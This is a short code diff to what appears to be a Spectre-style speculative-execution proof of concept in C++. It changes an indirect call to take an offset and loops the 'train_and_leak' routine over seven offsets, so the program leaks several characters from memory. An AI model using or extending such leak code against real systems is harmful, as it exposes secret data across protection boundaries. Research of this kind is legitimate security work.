@@ -10,6 +10,8 @@ typedef char(*functype)(int num);
 #define SENTINAL1 ((char)1)
 #define SENTINAL2 ((char)2)
 
+int call_indirect_offset = 0;
+
 __attribute__((noinline))
 char dummy_func(int v) {
     return SENTINAL1;
@@ -18,7 +20,7 @@ char dummy_func(int v) {
 __attribute__((noinline))
 char callIndirect(functype* func, bool* exec) {
     if (*exec) {
-        return (*func)(0);
+        return (*func)(call_indirect_offset);
     }
     return SENTINAL2;
 }
@@ -102,7 +104,9 @@ char train_and_leak() {
 __attribute__((noinline))
 int main(int argc, char const *argv[])
 {
-    char leaked = train_and_leak();
-    std::cout << "Leaked the character " << leaked << "(charcode: " << (int) leaked << ')' << std::endl;
+    for(call_indirect_offset = 0; call_indirect_offset < 7; call_indirect_offset++) {
+        char leaked = train_and_leak();
+        std::cout << "Leaked the character " << leaked << "(charcode: " << (int) leaked << ')' << std::endl;
+    }
     return 0;
 }
